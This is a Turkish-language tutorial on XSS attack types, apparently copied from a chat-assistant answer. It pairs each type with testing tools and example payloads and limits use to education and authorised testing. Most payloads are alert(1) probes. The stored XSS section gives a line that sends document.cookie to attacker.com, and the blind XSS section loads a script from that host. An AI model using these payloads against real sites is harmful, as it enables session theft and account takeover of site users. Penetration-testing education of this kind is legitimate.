🛡️ XSS Saldırı Yöntemleri Rehberi (Kali Linux & Python Odaklı)
Bu rehber, XSS (Cross-Site Scripting) saldırılarının yaygın türlerini ve her biri için kullanılabilecek teknik ve araçları detaylandırır. Bilgiler yalnızca eğitim ve izinli test ortamları için hazırlanmıştır. Gerçek sistemlerde izinsiz kullanımı etik dışıdır ve yasal sonuçlara yol açabilir.

🎯 XSS Türleri ve Teknikleri
1. Reflected XSS (Yansıtmalı)
Reflected XSS, zararlı girdilerin sunucu tarafından yansıtılarak doğrudan kullanıcı tarayıcısında çalıştırılmasıdır.

Adımlar:

Hedef URL'de input parametresi bulun.

Tarayıcıda payload enjekte edin (ör: <script>alert(1)</script>).

Eğer cevapta payload geri dönüyorsa ve çalışıyorsa, Reflected XSS mevcuttur.

Kullanılabilir Araçlar:

XSStrike

Burp Suite (Manual testing)

Python + Selenium/Playwright scriptleri

Platform Gereksinimi:

Python 3.x, tarayıcı sürücüleri, VS Code veya terminal.

2. Stored XSS (Kalıcı)
Stored XSS, zararlı kodun veritabanına kaydedilerek diğer kullanıcılara gösterilmesidir.

Adımlar:

Girdi formu veya yorum alanına payload enjekte edilir.

Kod veritabanına kaydedilir.

Başka bir kullanıcı ilgili sayfayı açtığında XSS tetiklenir.

Araçlar:

OWASP Juice Shop (Test ortamı)

Burp Suite

Manuel Payload Injection (form testi)

Kullanım:

php-template
Kopyala
Düzenle
<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>
3. DOM-Based XSS
DOM XSS, input verilerinin sadece JavaScript tarafından işlenip manipüle edildiği saldırılardır.

Tespit:

Sayfa kaynağında XSS yoksa ama DevTools ile payload çalışıyorsa DOM XSS olabilir.

URL fragment (#) veya JavaScript kontrollü değişkenlerde test yapılır.

Araçlar:

DOM Invader (Burp Suite)

Chrome DevTools

Manual JS Debug

Örnek Test:

php-template
Kopyala
Düzenle
http://hedef.com/page#<script>alert(1)</script>
4. Event Handler XSS
HTML elementlerinin içine yerleştirilen event’lerle tetiklenir (onerror, onload, onclick).

Payload:

html
Kopyala
Düzenle
<img src=x onerror=alert(1)>
Kullanım Senaryosu:

Yorum sistemleri

Profil bio alanları

5. Mutation XSS (mXSS)
Tarayıcıların DOM sanitizasyonundaki hataları kullanır.

Araçlar:

mXSS tool (DOMPurify test kit)

Firefox Developer Tools

Payload:

html
Kopyala
Düzenle
<a><input autofocus onfocus=alert(1)></a>
6. Blind XSS
Payload hemen tetiklenmez, ama arka plandaki admin panel veya log okuyucular üzerinden çalıştırılır.

Test Şekli:

html
Kopyala
Düzenle
<script src="http://attacker.com/xss.js"></script>
Kullanım:

Webhook üzerinden XSS tetikleyicileri

Logger sistemleri

7. Polyglot XSS
Her ortamda çalışabilecek tek satırlık “çok amaçlı” payload’lardır.

Örnek:

html
Kopyala
Düzenle
"><script>alert(1)</script>
Amaç:

Filtreleri aşmak

Parametre dışı alanları tetiklemek

8. AngularJS/ReactJS XSS (Framework-Based)
Bazı JS framework'leri (Angular, Vue, React) içindeki özel injection zayıflıkları kullanılır.

Payload (Angular için):

html
Kopyala
Düzenle
{{constructor.constructor('alert(1)')()}}
Not: Sadece uygun sürümlerde çalışır.

9. JSON/REST API XSS
Uygulamanın API response’unda yetersiz encoding varsa, XSS payload’ları JSON içinde çalışabilir.

Kullanım:

JSONP çağrıları

API hata mesajları içine payload yerleştirme

10. File Upload XSS
HTML içeren bir dosyanın (SVG, HTML, XML) yüklenmesi ile tetiklenir.

Payload:

<svg onload=alert(1)> içeren .svg dosyası

Test:

Açılan dosya direkt tarayıcıda çalışıyorsa ve JavaScript tetikleniyorsa XSS var.

🔧 Gereksinimler
Araç	Platform	Özellikler	Kurulum
XSStrike	Python	Otomatik Reflected/DOM XSS testi	git clone, pip install -r requirements
Burp Suite	Java	Proxy, Manual XSS tespiti, DOM analiz	Resmi site üzerinden indirilmeli
Selenium	Python	Tarayıcı üzerinden XSS tetikleme	pip install selenium, ChromeDriver
OWASP ZAP	Java	GUI tabanlı güvenlik tarama, XSS tespiti	apt install zaproxy
Playwright	Python/Node.js	Headless tarayıcı ile payload test	pip install playwright
